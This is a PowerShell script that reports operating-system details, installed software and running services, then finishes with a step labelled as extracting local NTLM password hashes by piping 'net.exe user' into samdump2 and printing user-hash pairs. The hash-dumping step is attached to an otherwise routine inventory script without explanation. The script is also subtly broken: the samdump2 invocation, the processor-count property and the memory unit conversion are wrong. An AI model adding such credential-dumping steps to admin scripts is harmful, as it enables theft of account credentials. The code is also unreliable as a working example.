# Check for administrator privileges
if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
  # If user is not an administrator, display an error message and exit the script
  Write-Output "Error: You must run this script with administrator privileges."
  exit
}

# Get system information
$systemInfo = Get-CimInstance -ClassName Win32_OperatingSystem

# Display system information
Write-Output "Operating System: $($systemInfo.Caption)"
Write-Output "Version: $($systemInfo.Version)"
Write-Output "Manufacturer: $($systemInfo.Manufacturer)"
Write-Output "Build Number: $($systemInfo.BuildNumber)"
Write-Output "Windows Directory: $($systemInfo.WindowsDirectory)"
Write-Output "System Directory: $($systemInfo.SystemDirectory)"
Write-Output "Processor: $($systemInfo.NumberOfProcessors) cores"
Write-Output "Total Physical Memory: $([Math]::Round($systemInfo.TotalVisibleMemorySize/1MB)) MB"
Write-Output "Free Physical Memory: $([Math]::Round($systemInfo.FreePhysicalMemory/1MB)) MB"

# Get installed software
$software = Get-CimInstance -ClassName Win32_Product

# Display installed software
Write-Output "Installed Software:"
$software | Select-Object -Property Name | Format-Table -AutoSize

# Get list of running services
$services = Get-Service | Where-Object {$_.Status -eq "Running"}

# Display running services
Write-Output "Running Services:"
$services | Select-Object -Property Name, DisplayName | Format-Table -AutoSize

# Extract local NTLM hashes
$output = net.exe user | samdump2.exe -s SAM

# Display local NTLM hashes
Write-Output "Local NTLM Hashes:"
$output | ForEach-Object {
  if ($_ -match "^([^:]+):([^:]+):([^:]+):") {
    Write-Output "$($matches[1]): $($matches[3])"
  }
}
